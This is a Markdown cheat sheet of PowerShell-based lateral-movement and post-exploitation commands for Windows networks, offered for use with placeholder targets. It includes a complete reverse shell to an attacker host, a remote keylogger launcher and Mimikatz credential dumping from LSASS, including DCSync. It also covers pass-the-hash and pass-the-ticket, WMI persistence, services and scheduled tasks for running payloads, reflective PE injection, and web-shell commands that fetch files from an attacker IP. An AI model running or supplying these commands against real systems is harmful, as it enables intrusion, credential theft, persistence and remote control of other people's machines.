# PowerShell Remoting

If PowerShell Remoting is enabled, it can be used to execute commands on remote machines.

#### Check if PowerShell Remoting is Enabled
```powershell
Test-WSMan -ComputerName <target_ip> -Credential <domain>\<user>
```

```powershell
Test-WSMan -ComputerName <target_ip> -Credential (Get-Credential)
```

#### Enable PowerShell Remoting on Target System
```powershell
Invoke-Command -ComputerName <target_ip> -Credential <domain>\<user> -ScriptBlock { Enable-PSRemoting -Force }
```

#### Open Remote PowerShell Session
```powershell
Enter-PSSession -ComputerName <target_ip> -Credential <domain>\<user>
```

#### Run Commands Remotely and Collect Output
```powershell
Invoke-Command -ComputerName <target_ip> -Credential <domain>\<user> -ScriptBlock { <commands>  }
```

#### Run a Script on Multiple Hosts Simultaneously
```powershell
Invoke-Command -ComputerName <target_ip1>,<target_ip2> -Credential <domain>\<user> -ScriptBlock { <commands> }
```

#### Execute Scripts on Remote Host
```powershell
Invoke-Command -ComputerName <target_ip> -Credential <domain>\<user> -FilePath C:\path\to\script.ps1
```

#### Bypass WinRM SSL Certificate Check
```powershell
$opts = New-PSSessionOption -SkipCACheck -SkipCNCheck
New-PSSession -ComputerName <target_ip> -UseSSL -SessionOption $opts
```

#### Start Keylogger Remotely
```powershell
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command 'Add-Type -TypeDefinition $([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\"<base64_payload_here>\"))); [Logger]::StartLogging()'" -ComputerName <target_ip>
```

# Pivoting and Tunneling

#### PowerShell Remoting Tunnels
- Create a PowerShell Remoting Session Through SSH:
	```powershell
	ssh -L <local_port>:<target_ip>:5985 <user>@<pivot_host>
	Enter-PSSession -ComputerName localhost -Port <local_port> -Credential <domain>\<user>
	```
- Forward a Port Through SSH for RDP:
	```powershell
	ssh -L 3389:<target_ip>:3389 <user>@<pivot_host>
	```

#### Port Forwarding with PowerShell
- Set Up a TCP Port Forwarding:
	```powershell
	$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, <local_port>)
	$listener.Start()
	$listener.AcceptTcpClient()
	```
- Forward a Port Through a Remote Host Using SSH and PowerShell:
	```powershell
	ssh -L <local_port>:<target_ip>:<target_port> <user>@<pivot_host>
	$client = New-Object System.Net.Sockets.TcpClient("<target_ip>", <target_port>)
	```

#### Creating a Reverse Shell
- Establish a PowerShell Reverse Shell:
	```powershell
	$client = New-Object System.Net.Sockets.TcpClient("<attack_ip>", <attack_port>)
	$stream = $client.GetStream()
	$writer = New-Object System.IO.StreamWriter($stream)
	$writer.AutoFlush = $true
	$buffer = New-Object System.Byte[] 1024
	$encoding = New-Object Text.ASCIIEncoding
	
	while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
	    $data = $encoding.GetString($buffer, 0, $i)
	    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
	    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
	    $sendbyte = ($encoding.GetBytes($sendback2))
	    $stream.Write($sendbyte, 0, $sendbyte.Length)
	    $stream.Flush()
	}
	$client.Close()
	```

# Custom Scripts and Automation

#### PowerShell Scripts for Automation
- Run PowerShell Script Remotely Using Invoke-Command:
	```powershell
	Invoke-Command -ComputerName <target_ip> -FilePath "C:\path\to\script.ps1" -Credential <domain>\<user>
	```
- Execute PowerShell Script from a UNC Path:
	```powershell
	Invoke-Command -ScriptBlock { & "\\<target_ip>\share\path\to\script.ps1" } -ComputerName <target_ip> -Credential <domain>\<user>
	```

#### Automating File Transfers
- Copy Multiple Files to a Remote Host:
	```powershell
	$files = Get-ChildItem "C:\local\path\*"
	foreach ($file in $files) {
	    Copy-Item -Path $file.FullName -Destination "\\<target_ip>\C$\remote\path" -Credential <domain>\<user>
	}
	```
- Download Files from Multiple Remote Hosts:
	```powershell
	$hosts = Get-Content "hosts.txt"
	foreach ($host in $hosts) {
	    Copy-Item -Path "\\$host\C$\remote\path\file.txt" -Destination "C:\local\path" -Credential <domain>\<user>
	}
	```

#### Automating Commands Across Multiple Hosts
- Execute a Command Across Multiple Hosts:
	```powershell
	$hosts = Get-Content "hosts.txt"
	foreach ($host in $hosts) {
	    Invoke-Command -ComputerName $host -ScriptBlock { <command> } -Credential <domain>\<user>
	}
	```
- Reboot Multiple Hosts Simultaneously:
	```powershell
	$hosts = Get-Content "hosts.txt"
	foreach ($host in $hosts) {
	    Restart-Computer -ComputerName $host -Credential <domain>\<user> -Force
	}
	```

# Remote Scheduled Tasks

#### List Scheduled Tasks Remotely
```powershell
Invoke-Command -ComputerName <target_ip>  -Credential <domain>\<user> -ScriptBlock { Get-ScheduledTask }
```

#### Create a Scheduled Task Remotely
```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File C:\path\to\script.ps1"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MaliciousTask" -ComputerName <target_ip> -User "Administrator" -Password "Password"
```

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -File C:\path\to\script.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "MaliciousTask" -Action $action -Trigger $trigger -User "SYSTEM" -ComputerName <target_ip>
```

```powershell
schtasks /create /s <target_ip> /u <domain>\<user> /p <password> /tn "MaliciousTask" /tr "cmd.exe /c <command>" /sc once /st 00:00
```

#### Run a Scheduled Task Remotely
```powershell
schtasks /run /s <target_ip> /u <domain>\<user> /p <password> /tn "MaliciousTask"
```

#### Delete a Scheduled Task on Remote System
```powershell
Unregister-ScheduledTask -TaskName "MaliciousTask" -ComputerName <target_ip> -Confirm:$false
```

```powershell
schtasks /delete /s <target_ip> /u <domain>\<user> /p <password> /tn "MaliciousTask" /f
```

# Remote Service

Windows services can be used to execute commands or deploy payloads remotely.

#### Create a Service for Payload Execution
```powershell
New-Service -ComputerName <target_ip> -Credential <domain>\<user> -Name "MaliciousService" -BinaryPathName "C:\path\to\payload.exe" -DisplayName "MaliciousService" -StartupType Manual 
```

#### Start a Remote Service
```powershell
Start-Service -ComputerName <target_ip> -Credential <domain>\<user> -Name "MaliciousService" 
```

#### Stop a Remote Service
```powershell
Stop-Service -ComputerName <target_ip> -Credential <domain>\<user> -Name "MaliciousService" 
```

# Windows Remote Management (WinRM)

WinRM is enabled by default on Windows Servers, and if enabled on clients, it allows for remote command execution.

#### Test WinRM Access on Remote Host
```powershell
Test-WSMan -ComputerName <target_ip>
```

#### Open Remote PowerShell Session
```powershell
Enter-PSSession -ComputerName <target_ip> -Credential <domain>\<user>
```

#### Execute a Command on a Remote Host via WinRM
```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName <target_ip> -Credential <domain>\<user> -ArgumentList "cmd.exe /c <command>"
```

# Windows Management Instrumentation (WMI)

WMI is a powerful mechanism for lateral movement, enabling remote execution of commands or scripts.

#### Check Remote System Information
```powershell
Get-WmiObject -ComputerName <target_ip> -Credential <domain>\<user> -Class Win32_OperatingSystem
```

#### Enumerate Running Processes on a Remote Machine
```powershell
Get-WmiObject -ComputerName <target_ip> -Credential <domain>\<user> -Class Win32_Process
```

#### Execute Commands via WMI
```powershell
Invoke-WmiMethod -ComputerName <target_ip> -Credential <domain>\<user> -Class Win32_Process -Name Create -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\path\to\script.ps1"
```

#### Execute Remote PowerShell with WMI
```powershell
Invoke-WmiMethod -ComputerName <target_ip> -Credential <domain>\<user> -Class Win32_Process -Name Create -ArgumentList "powershell.exe -Command {Get-Process}"
```

#### Reboot a Remote Machine via WMI
```powershell
Invoke-WmiMethod -ComputerName <target_ip> -Credential <domain>\<user> -Class Win32_OperatingSystem -Name Reboot
```

#### Persistent WMI Event Subscription
```powershell
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name = 'Filter'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_LocalTime" AND TargetInstance.Hour = 13'}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name = 'Consumer'; CommandLineTemplate = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\path\to\malicious.ps1'}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $filter; Consumer = $consumer }
```

# Remote Desktop Protocol (RDP)

RDP allows for full graphical interaction with the remote system, often used in post-exploitation for lateral movement.

#### Enable RDP on Target System
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

#### Connect to Remote System via RDP
```powershell
mstsc /v:<target_ip>
```

# SMB

Discovering accessible shares is key for lateral movement. Misconfigured shares can allow an attacker to copy tools or data for further attacks. Copying payloads to remote systems and executing them via SMB shares.

#### List Accessible Shares on Remote Hosts
```powershell
Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-SmbShare }
```

#### Check Permissions on Remote Shares
```powershell
Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-SmbShareAccess -Name "<share_name>" }
```

#### Upload and Download from Remote System
- Transfer a File to a Remote Host via SMB:
	```powershell
	Copy-Item -Path "C:\path\to\file.txt" -Destination "\\<target_ip>\C$\path\to\save" -Credential <domain>\<user>
	```
- Download a File from a Remote Host via SMB:
	```powershell
	Copy-Item -Path "\\<target_ip>\C$\path\to\file.txt" -Destination "C:\path\to\save" -Credential <domain>\<user>
	```

#### Execute Payload on Remote System
```powershell
Invoke-Command -ComputerName <target_ip> -Credential <domain>\<user> -ScriptBlock { Start-Process "C:\Temp\malicious.exe" }
```

# Component Object Model (COM)

#### Execute a Program on a Remote Host via DCOM
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "<target_ip>"))
$com.ShellExecute("cmd.exe", "/c <command>", "", "runas", 0)
```

#### Open a Remote PowerShell Session Using DCOM
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "<target_ip>"))
$com.ShellExecute("powershell.exe", "-ExecutionPolicy Bypass -NoProfile", "", "runas", 0)
```

# Execute Portable Executable in Memory

Run executables from memory on remote systems.

#### Inject PE (Portable Executable) into Remote Process:
```powershell
Invoke-ReflectivePEInjection -PEBytes (Get-Content C:\path\to\malicious.exe -Encoding Byte) -ProcessID (Get-Process -ComputerName <target_ip> | Where-Object { $_.ProcessName -eq "explorer" }).Id
```

# Active Directory and Credential Abuse

If you have captured NTLM hashes, pass-the-hash techniques allow you to authenticate without plaintext credentials.

#### Active Directory Enumeration
- List All Domain Computers:
	```powershell
	Get-ADComputer -Filter * | Select-Object Name
	```
- List All Domain Users:
	```powershell
	Get-ADUser -Filter * | Select-Object Name
	```
- Enumerate Domain Trusts:
	```powershell
	Get-ADTrust -Filter * | Select-Object Name, TrustType, TrustDirection
	```

#### Credential Dumping
- Dump LSASS Memory for Credential Extraction:
	```powershell
	rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID_of_lsass> C:\Temp\lsass.dmp full
	```
- Dump Cached Credentials Using Mimikatz:
	```powershell
	Invoke-Mimikatz -Command '"sekurlsa::minidump C:\Temp\lsass.dmp"'
	Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
	```
- Dump NTLM Hashes of Domain Users:
	```powershell
	Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /user:<user>"'
	```

#### Pass-The-Hash using PowerShell and PSExec
```powershell
Invoke-Command -ComputerName <target_ip> -ScriptBlock {
    net use \\<target_ip>\IPC$ /user:<domain>\<username> <NTLM_hash>
}
```

#### Pass-the-Hash Using PowerShell Over SMB
```powershell
net use \\<target_ip>\C$ /user:<domain>\<username> /password:<NTLM_hash>
```

#### Pass-the-Hash via Mimikatz
```powershell
Invoke-Expression -Command "Invoke-Mimikatz -Command 'sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell.exe'"
```

- Create a New SMB Session Using Pass-the-Hash:
	```powershell
	$SecPassword = ConvertTo-SecureString "<ntlm_hash>" -AsPlainText -Force
	$Cred = New-Object System.Management.Automation.PSCredential ("<domain>\<user>", $SecPassword)
	New-SMBSession -Credential $Cred -ComputerName <target_ip>
	```

#### Pass-the-Ticket (Kerberos)
- Use Kerberos Ticket for Remote Access:
	```powershell
	klist purge
	Invoke-Mimikatz -Command '"kerberos::ptt <ticket_file>.kirbi"'
	Enter-PSSession -ComputerName <target_ip> -Credential <domain>\<user>
	```

#### SMB Relay via Responder
- Start Responder on Attack Host:
	```bash
	sudo responder -I eth0 -wrfPv
	```
- Relay NTLM via `impacket-smbrelayx`:
	```bash
	impacket-smbrelayx -h <target_ip> -c "powershell -NoProfile -Command {Get-Process}"
	```

# Lateral Movement via Web Exploits and Web Shells

#### Using Web Shells for Command Execution
- Execute a Command Through a Web Shell:
	```powershell
	Invoke-WebRequest -Uri "http://<target_ip>/webshell?cmd=<command>" -UseBasicParsing
	```
- Upload a File Through a Web Shell:
	```powershell
	Invoke-WebRequest -Uri "http://<target_ip>/webshell?cmd=certutil+-urlcache+-split+-f+http://<attack_ip>/file.exe+C:\temp\file.exe" -UseBasicParsing
	```

#### Reverse Tunneling Through Web Exploits
- Establish a Reverse Shell via a Web Exploit:
	```powershell
	Invoke-WebRequest -Uri "http://<target_ip>/webshell?cmd=cmd.exe+/c+powershell+-NoP+-NonI+-W+Hidden+-Exec+Bypass+-Enc+<base64_encoded_payload>" -UseBasicParsing
	```
- Create a Reverse SSH Tunnel Through a Web Exploit:
	```powershell
	Invoke-WebRequest -Uri "http://<target_ip>/webshell?cmd=cmd.exe+/c+ssh+-R+<remote_port>:<attack_ip>:<attack_port>+<user>@<intermediary_host>" -UseBasicParsing
	```

# Cloud

#### AWS Command Execution
- List Running EC2 Instances:
	```powershell
	aws ec2 describe-instances --query "Reservations[*].Instances[*].InstanceId"
	```
- Execute a Command on a Remote EC2 Instance Using SSM:
	```powershell
	aws ssm send-command --instance-ids "<instance_id>" --document-name "AWS-RunPowerShellScript" --parameters "commands=hostname"
	```
- Enumerate IAM Roles:
	```powershell
	aws iam list-roles --query 'Roles[*].RoleName'
	```